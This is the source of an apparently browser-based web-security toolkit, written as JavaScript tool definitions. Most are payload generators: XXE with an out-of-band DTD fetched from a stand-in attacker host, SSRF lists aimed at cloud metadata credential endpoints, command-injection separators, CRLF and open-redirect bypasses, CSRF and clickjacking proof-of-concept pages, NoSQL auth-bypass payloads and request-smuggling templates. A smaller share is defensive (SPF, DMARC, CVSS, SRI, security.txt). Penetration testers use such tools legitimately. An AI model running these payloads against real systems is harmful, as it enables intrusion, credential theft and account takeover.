  { id: "w-xxe-builder", name: "XXE Payload Builder", cat: "websec", desc: "Build an XML External Entity payload to test for local-file-read via XML parsers.", tags: ["xxe", "xml", "injection"],
    inputs: [{ k: "file", label: "File to read", type: "text", value: "/etc/passwd" }, { k: "elementName", label: "XML element name carrying payload", type: "text", value: "foo" }],
    run(v) {
      const file = v.file || "/etc/passwd";
      const el = v.elementName || "foo";
      return `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE ${el} [ <!ENTITY xxe SYSTEM "file://${file}"> ]>\n<${el}>&xxe;</${el}>\n\nOOB variant (blind XXE, needs a listener you control):\n<?xml version="1.0"?>\n<!DOCTYPE ${el} [ <!ENTITY % xxe SYSTEM "http://ATTACKER-HOST/evil.dtd"> %xxe; ]>\n<${el}>test</${el}>`;
    } },

  { id: "w-ssrf-targets", name: "SSRF Target Payload List", cat: "websec", desc: "Common internal/metadata targets and encodings to probe for Server-Side Request Forgery.", tags: ["ssrf", "cloud", "metadata"],
    inputs: [{ k: "custom", label: "Also include this internal host", type: "text", placeholder: "internal-api.corp" }],
    run(v) {
      const lines = [
        "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/", "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/   (AWS IMDS)",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/   (AWS IMDS creds)",
        "http://metadata.google.internal/computeMetadata/v1/   (GCP, needs Metadata-Flavor: Google header)",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Azure IMDS, needs Metadata: true header)",
        "http://100.100.100.200/latest/meta-data/   (Alibaba Cloud)",
        "http://127.1/   (short-form loopback)",
        "http://0177.0.0.1/   (octal loopback)",
        "http://2130706433/   (decimal loopback = 127.0.0.1)",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/   (IPv4-mapped IPv6)",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info   (Redis probe)",
        "gopher://127.0.0.1:6379/_%2A1%0d%0a...   (Gopher smuggling, redis/memcache)",
      ];
      if (v.custom) lines.push(`http://${v.custom}/`);
      return lines.join("\n");
    } },

  { id: "w-cmdi-cheatsheet", name: "Command Injection Cheatsheet", cat: "websec", desc: "Shell metacharacter separators used to chain injected OS commands, with notes on when each applies.", tags: ["cmdi", "injection", "shell"],
    inputs: [{ k: "cmd", label: "Command to inject", type: "text", value: "id" }],
    run(v) {
      const c = v.cmd || "id";
      return [
        `; ${c}            — sequential (sh/bash, runs regardless of prior exit code)`,
        `&& ${c}           — sequential, only if previous command succeeded`,
        `|| ${c}           — sequential, only if previous command failed`,
        `| ${c}            — pipe stdout into injected command`,
        `\`${c}\`            — command substitution (executes inline)`,
        `$(${c})           — command substitution (POSIX)`,
        `\\n${c}            — newline separator (some parsers)`,
        `%0a${c}           — URL-encoded newline (for GET params)`,
        `& ${c}            — Windows cmd.exe sequential (background on some shells)`,
        `${c}#             — comment out the rest of the line (bypass trailing args)`,
      ].join("\n");
    } },

  { id: "w-crlf-injection", name: "CRLF Injection Payload", cat: "websec", desc: "Build a CRLF-injection payload to test for HTTP response splitting / header injection.", tags: ["crlf", "http", "injection"],
    inputs: [{ k: "header", label: "Header to inject", type: "text", value: "Set-Cookie" }, { k: "value", label: "Injected header value", type: "text", value: "admin=true" }],
    run(v) {
      const h = v.header || "X-Injected";
      const val = v.value || "true";
      return [
        `Raw:         \\r\\n${h}: ${val}`,
        `URL-encoded: %0d%0a${h}%3a%20${val}`,
        `Double-enc:  %250d%250a${h}%3a%20${val}`,
        `UTF-8 var:   %E5%98%8A%E5%98%8D${h}: ${val}   (some WAF bypasses interpret as CRLF)`,
        ``,
        `Response-splitting body-injection example:`,
        `/page?x=test%0d%0a%0d%0a<script>alert(1)</script>`,
      ].join("\n");
    } },

  { id: "w-open-redirect", name: "Open Redirect Payload List", cat: "websec", desc: "Common bypass payloads for testing redirect/URL parameters against allowlist filters.", tags: ["redirect", "bypass"],
    inputs: [{ k: "target", label: "Attacker-controlled host", type: "text", value: "evil.example" }],
    run(v) {
      const t = v.target || "evil.example";
      return [
        `https://${t}`,
        `//${t}`,
        `///${t}`,
        `https:${t}`,
        `/\\${t}`,
        `https://trusted.example.${t}`,
        `https://trusted.example@${t}`,
        `https://trusted.example.com.${t}`,
        `https://${t}#trusted.example.com`,
        `https://${t}?trusted.example.com`,
        `/%09/${t}`,
        `https://${t}\\@trusted.example.com`,
      ].join("\n");
    } },

  // ---------------- PoC page generators ----------------
  { id: "w-csrf-poc", name: "CSRF PoC Form Generator", cat: "websec", desc: "Generate a self-submitting HTML form to demonstrate a CSRF finding against a given action/method/fields.", tags: ["csrf", "poc", "html"],
    inputs: [
      { k: "action", label: "Target action URL", type: "text", value: "https://victim.example/account/email" },
      { k: "method", label: "Method", type: "select", opts: ["POST", "GET"], value: "POST" },
      { k: "fields", label: "Fields (name=value, one per line)", type: "textarea", rows: 3, value: "email=attacker@evil.example" },
      { k: "autoSubmit", label: "Auto-submit on load", type: "checkbox", value: true },
    ],
    run(v, H) {
      if (!v.action) return { error: "Set a target action URL." };
      const rows = (v.fields || "").split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
      const inputs = rows.map((r) => {
        const idx = r.indexOf("=");
        const name = idx >= 0 ? r.slice(0, idx) : r;
        const val = idx >= 0 ? r.slice(idx + 1) : "";
        return `  <input type="hidden" name="${H.escapeHtml(name)}" value="${H.escapeHtml(val)}">`;
      }).join("\n");
      return `<!-- CSRF PoC — authorized testing only -->\n<html><body>\n<form id="csrf-poc" action="${H.escapeHtml(v.action)}" method="${v.method}">\n${inputs}\n  <input type="submit" value="Submit request">\n</form>\n${v.autoSubmit ? '<script>document.getElementById("csrf-poc").submit();</script>' : ""}\n</body></html>`;
    } },

  { id: "w-clickjacking-poc", name: "Clickjacking PoC Iframe Generator", cat: "websec", desc: "Generate an HTML page framing a target URL to demonstrate missing X-Frame-Options/frame-ancestors.", tags: ["clickjacking", "poc", "iframe"],
    inputs: [{ k: "url", label: "Target URL", type: "text", value: "https://victim.example/settings" }, { k: "opacity", label: "Iframe opacity", type: "range", min: 0, max: 100, step: 5, value: 50 }],
    run(v, H) {
      if (!v.url) return { error: "Set a target URL." };
      const op = (H.clampInt(v.opacity, 0, 100, 50)) / 100;
      return `<!-- Clickjacking PoC — authorized testing only -->\n<html>\n<head><style>\n  iframe { width: 900px; height: 600px; opacity: ${op}; position: absolute; top: 100px; left: 50px; z-index: 2; }\n  button.lure { position: absolute; top: 300px; left: 200px; z-index: 1; font-size: 24px; }\n</style></head>\n<body>\n  <button class="lure">Click here to win a prize</button>\n  <iframe src="${H.escapeHtml(v.url)}"></iframe>\n</body>\n</html>`;
    } },

  { id: "w-htaccess-basicauth", name: ".htaccess Basic Auth Snippet", cat: "websec", desc: "Generate an Apache .htaccess + .htpasswd snippet to password-protect a directory during testing/staging.", tags: ["apache", "htaccess", "auth"],
    inputs: [{ k: "realm", label: "Auth realm", type: "text", value: "Restricted Area" }, { k: "user", label: "Username", type: "text", value: "tester" }, { k: "passwordHashHint", label: "(hash password separately with htpasswd -c)", type: "text", value: "", inputType: "text" }],
    run(v) {
      const realm = v.realm || "Restricted Area";
      const user = v.user || "tester";
      return [
        `# .htaccess`,
        `AuthType Basic`,
        `AuthName "${realm}"`,
        `AuthUserFile /path/to/.htpasswd`,
        `Require valid-user`,
        ``,
        `# generate .htpasswd (bcrypt) separately:`,
        `htpasswd -B -c /path/to/.htpasswd ${user}`,
      ].join("\n");
    } },

  // ---------------- Email / DNS auth ----------------
  { id: "w-spf-builder", name: "SPF Record Builder", cat: "websec", desc: "Build a DNS SPF TXT record from allowed senders (authorized mail-domain hardening).", tags: ["spf", "dns", "email"],
    inputs: [
      { k: "includes", label: "include: domains (comma-sep)", type: "text", placeholder: "_spf.google.com, sendgrid.net" },
      { k: "ip4", label: "ip4 addresses (comma-sep)", type: "text", placeholder: "203.0.113.10" },
      { k: "a", label: "Allow sending 'a' record host", type: "checkbox" },
      { k: "mx", label: "Allow sending MX hosts", type: "checkbox", value: true },
      { k: "all", label: "All mechanism", type: "select", opts: [["-all", "hard fail (-all)"], ["~all", "soft fail (~all)"], ["?all", "neutral (?all)"]], value: "-all" },
    ],
    run(v) {
      const parts = ["v=spf1"];
      if (v.mx) parts.push("mx");
      if (v.a) parts.push("a");
      (v.ip4 || "").split(",").map((s) => s.trim()).filter(Boolean).forEach((ip) => parts.push(`ip4:${ip}`));
      (v.includes || "").split(",").map((s) => s.trim()).filter(Boolean).forEach((d) => parts.push(`include:${d}`));
      parts.push(v.all);
      return parts.join(" ");
    } },

  { id: "w-dkim-explainer", name: "DKIM Explainer", cat: "websec", desc: "Explain DKIM record structure and how signature verification works, for auditing a domain's mail auth setup.", tags: ["dkim", "dns", "email"],
    inputs: [{ k: "selector", label: "Selector", type: "text", value: "default" }, { k: "domain", label: "Domain", type: "text", value: "example.com" }],
    run(v) {
      const selector = v.selector || "default";
      const domain = v.domain || "example.com";
      return [
        `DNS lookup location: ${selector}._domainkey.${domain}  (TXT record)`,
        ``,
        `Record format:  v=DKIM1; k=rsa; p=<base64 public key>`,
        ``,
        `How it works:`,
        `1. Sending server signs selected headers + body hash with its RSA/Ed25519 private key.`,
        `2. Signature + selector go in the DKIM-Signature header (d=domain; s=selector; bh=; b=).`,
        `3. Receiver fetches the public key from ${selector}._domainkey.${domain} and verifies the signature.`,
        `4. Pass proves the message wasn't altered in transit and came from a holder of the private key — it does NOT verify the From: address (that's what DMARC alignment does).`,
        ``,
        `Audit checks: key length >= 2048 bit RSA, rotate selectors periodically, ensure p= is not empty (revoked key), confirm alignment with DMARC.`,
      ].join("\n");
    } },

  { id: "w-dmarc-builder", name: "DMARC Record Builder", cat: "websec", desc: "Build a DNS DMARC TXT record with policy and aggregate-report address.", tags: ["dmarc", "dns", "email"],
    inputs: [
      { k: "policy", label: "Policy (p=)", type: "select", opts: ["none", "quarantine", "reject"], value: "quarantine" },
      { k: "subPolicy", label: "Subdomain policy (sp=)", type: "select", opts: [["", "(inherit)"], "none", "quarantine", "reject"], value: "" },
      { k: "rua", label: "Aggregate report email (rua)", type: "text", placeholder: "mailto:dmarc-reports@example.com" },
      { k: "pct", label: "pct (%)", type: "range", min: 0, max: 100, step: 5, value: 100 },
    ],
    run(v) {
      const parts = ["v=DMARC1", `p=${v.policy}`];
      if (v.subPolicy) parts.push(`sp=${v.subPolicy}`);
      if (v.rua) parts.push(`rua=${v.rua.startsWith("mailto:") ? v.rua : "mailto:" + v.rua}`);
      parts.push(`pct=${v.pct}`);
      parts.push("adkim=r", "aspf=r");
      return `_dmarc.example.com TXT "${parts.join("; ")}"`;
    } },

  // ---------------- Recon / dorking ----------------
  { id: "w-google-dork", name: "Google Dork Builder", cat: "websec", desc: "Compose a Google dork search string from site/inurl/intitle/filetype operators for authorized OSINT recon.", tags: ["dork", "osint", "recon"],
    inputs: [
      { k: "site", label: "site:", type: "text", placeholder: "example.com" },
      { k: "inurl", label: "inurl:", type: "text", placeholder: "admin" },
      { k: "intitle", label: "intitle:", type: "text", placeholder: "index of" },
      { k: "filetype", label: "filetype:", type: "text", placeholder: "pdf" },
      { k: "ext", label: "ext:", type: "text", placeholder: "log" },
      { k: "extra", label: "Extra terms", type: "text", placeholder: "\"password\"" },
    ],
    run(v) {
      const parts = [];
      if (v.site) parts.push(`site:${v.site}`);
      if (v.inurl) parts.push(`inurl:${v.inurl}`);
      if (v.intitle) parts.push(`intitle:"${v.intitle}"`);
      if (v.filetype) parts.push(`filetype:${v.filetype}`);
      if (v.ext) parts.push(`ext:${v.ext}`);
      if (v.extra) parts.push(v.extra);
      if (!parts.length) return { error: "Set at least one field." };
      return parts.join(" ");
    } },

  // ---------------- CVSS ----------------
  { id: "w-cvss-calc", name: "CVSS v3.1 Base Score Calculator", cat: "websec", desc: "Parse a CVSS v3.1 base vector string and compute the base score and severity rating.", tags: ["cvss", "score", "severity"],
    inputs: [{ k: "vector", label: "CVSS vector", type: "text", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }],
    run(v) {
      const vec = (v.vector || "").trim();
      if (!vec) return "";
      const m = {};
      vec.split("/").forEach((p) => { const [k, val] = p.split(":"); if (k && val) m[k] = val; });
      const need = ["AV", "AC", "PR", "UI", "S", "C", "I", "A"];
      for (const k of need) if (!m[k]) return { error: `Missing metric ${k} in vector.` };
      const AV = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[m.AV];
      const AC = { L: 0.77, H: 0.44 }[m.AC];
      const UI = { N: 0.85, R: 0.62 }[m.UI];
      const scoped = m.S === "C";
      const PR = scoped ? { N: 0.85, L: 0.68, H: 0.5 }[m.PR] : { N: 0.85, L: 0.62, H: 0.27 }[m.PR];
      const CIA = { N: 0, L: 0.22, H: 0.56 };
      const C = CIA[m.C], I = CIA[m.I], A = CIA[m.A];
      if ([AV, AC, UI, PR, C, I, A].some((x) => x === undefined)) return { error: "Invalid metric value in vector." };
      const iss = 1 - (1 - C) * (1 - I) * (1 - A);
      const impact = scoped ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
      const exploitability = 8.22 * AV * AC * PR * UI;
      if (impact <= 0) return "Base score: 0.0 (None) — no impact on C/I/A.";
      const raw = scoped ? Math.min(1.08 * (impact + exploitability), 10) : Math.min(impact + exploitability, 10);
      const score = Math.ceil(raw * 10) / 10;
      const sev = score === 0 ? "None" : score < 4 ? "Low" : score < 7 ? "Medium" : score < 9 ? "High" : "Critical";
      return `Base score: ${score.toFixed(1)} (${sev})\nImpact subscore: ${impact.toFixed(2)}\nExploitability subscore: ${exploitability.toFixed(2)}`;
    } },

  { id: "w-cvss-vector-builder", name: "CVSS v3.1 Vector Builder", cat: "websec", desc: "Build a CVSS v3.1 base vector string from metric dropdowns.", tags: ["cvss", "vector", "builder"],
    inputs: [
      { k: "AV", label: "Attack Vector", type: "select", opts: [["N", "Network"], ["A", "Adjacent"], ["L", "Local"], ["P", "Physical"]], value: "N" },
      { k: "AC", label: "Attack Complexity", type: "select", opts: [["L", "Low"], ["H", "High"]], value: "L" },
      { k: "PR", label: "Privileges Required", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "N" },
      { k: "UI", label: "User Interaction", type: "select", opts: [["N", "None"], ["R", "Required"]], value: "N" },
      { k: "S", label: "Scope", type: "select", opts: [["U", "Unchanged"], ["C", "Changed"]], value: "U" },
      { k: "C", label: "Confidentiality", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
      { k: "I", label: "Integrity", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
      { k: "A", label: "Availability", type: "select", opts: [["N", "None"], ["L", "Low"], ["H", "High"]], value: "H" },
    ],
    run(v) {
      return `CVSS:3.1/AV:${v.AV}/AC:${v.AC}/PR:${v.PR}/UI:${v.UI}/S:${v.S}/C:${v.C}/I:${v.I}/A:${v.A}`;
    } },

  // ---------------- Misc AppSec utilities ----------------
  { id: "w-sri-hash", name: "Subresource Integrity Hash", cat: "websec", desc: "Compute a sha384 hash of provided content and format it as an SRI integrity attribute.", tags: ["sri", "integrity", "hash"],
    inputs: [{ k: "content", label: "Script/style file contents", type: "textarea", rows: 6, placeholder: "console.log('hi');" }],
    async run(v, H) {
      if (!v.content) return "";
      const hex = await H.sha384(v.content);
      const bytes = H.fromHex(hex);
      const b64 = btoa(String.fromCharCode(...bytes));
      return `integrity="sha384-${b64}"\ncrossorigin="anonymous"\n\n<script src="..." integrity="sha384-${b64}" crossorigin="anonymous"></script>`;
    } },

  { id: "w-password-policy-check", name: "Password Policy Checker", cat: "websec", desc: "Check a candidate password against configurable complexity rules (for authorized policy audits).", tags: ["password", "policy", "audit"],
    inputs: [
      { k: "password", label: "Password", type: "text", inputType: "password", placeholder: "candidate password" },
      { k: "minLen", label: "Minimum length", type: "range", min: 4, max: 32, step: 1, value: 12 },
      { k: "reqUpper", label: "Require uppercase", type: "checkbox", value: true },
      { k: "reqLower", label: "Require lowercase", type: "checkbox", value: true },
      { k: "reqDigit", label: "Require digit", type: "checkbox", value: true },
      { k: "reqSpecial", label: "Require special char", type: "checkbox", value: true },
      { k: "noSpaces", label: "Disallow spaces", type: "checkbox" },
    ],
    run(v, H) {
      const p = v.password || "";
      if (!p) return "";
      const len = H.clampInt(v.minLen, 1, 128, 12);
      const checks = [
        [`Length >= ${len}`, p.length >= len],
        v.reqUpper ? ["Contains uppercase", /[A-Z]/.test(p)] : null,
        v.reqLower ? ["Contains lowercase", /[a-z]/.test(p)] : null,
        v.reqDigit ? ["Contains digit", /[0-9]/.test(p)] : null,
        v.reqSpecial ? ["Contains special character", /[^A-Za-z0-9]/.test(p)] : null,
        v.noSpaces ? ["No spaces", !/\s/.test(p)] : null,
      ].filter(Boolean);
      const lines = checks.map(([label, pass]) => `${pass ? "PASS" : "FAIL"}  ${label}`);
      const allPass = checks.every(([, pass]) => pass);
      lines.push("", allPass ? "Overall: MEETS policy." : "Overall: DOES NOT meet policy.");
      return lines.join("\n");
    } },

  { id: "w-security-txt", name: "security.txt Generator", cat: "websec", desc: "Generate an RFC 9116 security.txt file for a domain's vulnerability-disclosure process.", tags: ["security.txt", "disclosure", "rfc9116"],
    inputs: [
      { k: "contact", label: "Contact (mailto: or https:)", type: "text", value: "mailto:security@example.com" },
      { k: "expires", label: "Expires (YYYY-MM-DD)", type: "text", value: "2027-01-01" },
      { k: "policy", label: "Policy URL", type: "text", placeholder: "https://example.com/security-policy" },
      { k: "acknowledgments", label: "Acknowledgments URL", type: "text", placeholder: "https://example.com/hall-of-fame" },
      { k: "preferredLang", label: "Preferred languages", type: "text", value: "en" },
    ],
    run(v) {
      if (!v.contact || !v.expires) return { error: "Set Contact and Expires." };
      const lines = [`Contact: ${v.contact}`, `Expires: ${v.expires}T00:00:00.000Z`];
      if (v.policy) lines.push(`Policy: ${v.policy}`);
      if (v.acknowledgments) lines.push(`Acknowledgments: ${v.acknowledgments}`);
      if (v.preferredLang) lines.push(`Preferred-Languages: ${v.preferredLang}`);
      lines.push("Canonical: https://example.com/.well-known/security.txt");
      return lines.join("\n");
    } },

  { id: "w-tls-cipher-decoder", name: "TLS Cipher Suite Decoder", cat: "websec", desc: "Look up an IANA TLS cipher-suite name and explain its key exchange, authentication, encryption and MAC components.", tags: ["tls", "ssl", "cipher"],
    inputs: [{ k: "name", label: "Cipher suite name (or partial)", type: "text", placeholder: "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256" }],
    run(v) {
      const table = {
        "TLS_AES_128_GCM_SHA256": "TLS 1.3 | kx: (EC)DHE via key_share | auth: n/a (handshake signed) | enc: AES-128-GCM (AEAD) | mac: integrated (GCM)",
        "TLS_AES_256_GCM_SHA384": "TLS 1.3 | kx: (EC)DHE via key_share | auth: n/a (handshake signed) | enc: AES-256-GCM (AEAD) | mac: integrated (GCM)",
        "TLS_CHACHA20_POLY1305_SHA256": "TLS 1.3 | kx: (EC)DHE via key_share | auth: n/a (handshake signed) | enc: ChaCha20-Poly1305 (AEAD) | mac: integrated",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256": "kx: ECDHE (forward secrecy) | auth: RSA cert | enc: AES-128-GCM | mac: integrated (AEAD), PRF SHA256",
        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384": "kx: ECDHE (forward secrecy) | auth: RSA cert | enc: AES-256-GCM | mac: integrated (AEAD), PRF SHA384",
        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256": "kx: ECDHE (forward secrecy) | auth: ECDSA cert | enc: AES-128-GCM | mac: integrated (AEAD)",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384": "kx: ECDHE (forward secrecy) | auth: ECDSA cert | enc: AES-256-GCM | mac: integrated (AEAD)",
        "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256": "kx: ECDHE | auth: RSA cert | enc: ChaCha20-Poly1305 (AEAD, fast on mobile) | mac: integrated",
        "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256": "kx: ECDHE | auth: ECDSA cert | enc: ChaCha20-Poly1305 (AEAD) | mac: integrated",
        "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256": "kx: DHE (forward secrecy, no EC) | auth: RSA cert | enc: AES-128-GCM | mac: integrated (AEAD)",
        "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384": "kx: DHE | auth: RSA cert | enc: AES-256-GCM | mac: integrated (AEAD)",
        "TLS_RSA_WITH_AES_128_GCM_SHA256": "kx: RSA (NO forward secrecy) | auth: RSA cert | enc: AES-128-GCM | mac: integrated — WEAK: static RSA key exchange",
        "TLS_RSA_WITH_AES_256_GCM_SHA384": "kx: RSA (NO forward secrecy) | auth: RSA cert | enc: AES-256-GCM | mac: integrated — WEAK: static RSA key exchange",
        "TLS_RSA_WITH_AES_128_CBC_SHA": "kx: RSA (no PFS) | auth: RSA | enc: AES-128-CBC | mac: HMAC-SHA1 — WEAK: CBC padding-oracle risk (Lucky13), no PFS",
        "TLS_RSA_WITH_AES_256_CBC_SHA256": "kx: RSA (no PFS) | auth: RSA | enc: AES-256-CBC | mac: HMAC-SHA256 — WEAK: CBC risk, no PFS",
        "TLS_RSA_WITH_3DES_EDE_CBC_SHA": "kx: RSA (no PFS) | auth: RSA | enc: 3DES-CBC | mac: HMAC-SHA1 — BROKEN: 3DES SWEET32, deprecated",
        "TLS_RSA_WITH_RC4_128_SHA": "kx: RSA | auth: RSA | enc: RC4 | mac: HMAC-SHA1 — BROKEN: RC4 biases, must not be used",
        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA": "kx: ECDHE (PFS) | auth: RSA | enc: AES-128-CBC | mac: HMAC-SHA1 — legacy CBC suite, prefer GCM variant",
        "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384": "kx: ECDHE (PFS) | auth: RSA | enc: AES-256-CBC | mac: HMAC-SHA384 — legacy CBC suite",
        "TLS_DH_anon_WITH_AES_128_CBC_SHA": "kx: DH anonymous | auth: NONE — BROKEN: no authentication, trivial MITM, must never be enabled",
      };
      const q = (v.name || "").trim().toUpperCase();
      if (!q) return "";
      if (table[q]) return `${q}\n${table[q]}`;
      const matches = Object.keys(table).filter((k) => k.includes(q));
      if (!matches.length) return { error: "No matching cipher suite in the reference table." };
      return matches.map((k) => `${k}\n  ${table[k]}`).join("\n\n");
    } },

  { id: "w-nosqli-cheatsheet", name: "NoSQL Injection Cheatsheet", cat: "websec", desc: "MongoDB/NoSQL operator-injection payloads for auth-bypass and blind extraction testing.", tags: ["nosqli", "mongodb", "injection"],
    inputs: [{ k: "category", label: "Category", type: "select", opts: ["Auth bypass (JSON body)", "Auth bypass (query string)", "Blind boolean extraction", "JS where() injection"], value: "Auth bypass (JSON body)" }],
    run(v) {
      const sets = {
        "Auth bypass (JSON body)": [
          `{"username": "admin", "password": {"$ne": ""}}`,
          `{"username": {"$ne": null}, "password": {"$ne": null}}`,
          `{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}`,
          `{"username": "admin", "password": {"$gt": ""}}`,
        ],
        "Auth bypass (query string)": [
          `?username[$ne]=&password[$ne]=`,
          `?username=admin&password[$gt]=`,
          `?username[$regex]=^admin&password[$ne]=x`,
        ],
        "Blind boolean extraction": [
          `{"username": "admin", "password": {"$regex": "^a"}}   (probe char-by-char)`,
          `{"username": "admin", "password": {"$regex": "^" + "known_prefix" + "[a-z]"}}`,
        ],
        "JS where() injection": [
          `{"$where": "this.password.length > 0"}`,
          `{"$where": "sleep(5000)"}   (time-based blind, if $where JS eval enabled)`,
          `{"$where": "this.username == 'admin' && this.password.match(/^a/)"}`,
        ],
      };
      return sets[v.category].join("\n");
    } },

  { id: "w-smuggling-cheatsheet", name: "HTTP Request Smuggling Templates", cat: "websec", desc: "CL.TE / TE.CL / TE.TE raw request templates for testing front-end/back-end parsing discrepancies.", tags: ["smuggling", "http", "cl.te", "te.cl"],
    inputs: [{ k: "variant", label: "Variant", type: "select", opts: ["CL.TE", "TE.CL", "TE.TE (obfuscated)"], value: "CL.TE" },
      { k: "host", label: "Host header value", type: "text", value: "victim.example" }],
    run(v) {
      const host = v.host || "victim.example";
      const templates = {
        "CL.TE": `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`,
        "TE.CL": `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`,
        "TE.TE (obfuscated)": `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n`,
      };
      return `${templates[v.variant]}\n\n(Front-end vs back-end must disagree on which header — CL or TE — governs framing. Test with a raw socket tool, not a browser. Front-end parses per the FIRST header pair for the given variant name; send exactly as shown including \\r\\n line endings.)`;
    } },

  { id: "w-graphql-introspection", name: "GraphQL Introspection Query Builder", cat: "websec", desc: "Build a GraphQL introspection query to enumerate an API's schema, types and fields for authorized recon.", tags: ["graphql", "introspection", "recon"],
    inputs: [{ k: "depth", label: "Field-nesting depth", type: "select", opts: ["Full schema (types+fields)", "Query/Mutation root names only", "Minimal (__schema.types.name)"], value: "Full schema (types+fields)" }],
    run(v) {
      if (v.depth === "Minimal (__schema.types.name)") {
        return `{ __schema { types { name } } }`;
      }
      if (v.depth === "Query/Mutation root names only") {
        return `{\n  __schema {\n    queryType { name fields { name } }\n    mutationType { name fields { name } }\n  }\n}`;
      }
      return [
        "query IntrospectionQuery {",
        "  __schema {",
        "    queryType { name }",
        "    mutationType { name }",
        "    types {",
        "      kind",
        "      name",
        "      fields(includeDeprecated: true) {",
        "        name",
        "        args { name type { name kind ofType { name kind } } }",
        "        type { name kind ofType { name kind } }",
        "      }",
        "    }",
        "  }",
        "}",
      ].join("\n");
    } },
];
